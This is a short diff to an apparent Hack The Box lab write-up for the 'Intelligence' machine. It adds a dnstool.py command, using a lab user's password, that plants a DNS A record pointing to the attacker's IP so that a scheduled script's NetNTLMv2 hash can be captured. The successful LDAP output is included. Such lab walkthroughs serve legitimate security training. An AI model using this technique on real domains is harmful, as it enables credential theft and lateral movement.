@@ -455,3 +455,11 @@ User `ted.gaves`
 
 Based off this script i think i should be able to add a DNS entry to make it point to my server then since it runs every 5 minutes i can retrieve a NetNTLMv2 hash 
 
+```python
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --action add --record web-dmuhackers --data 10.10.14.90 --type A 10.129.95.154      
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
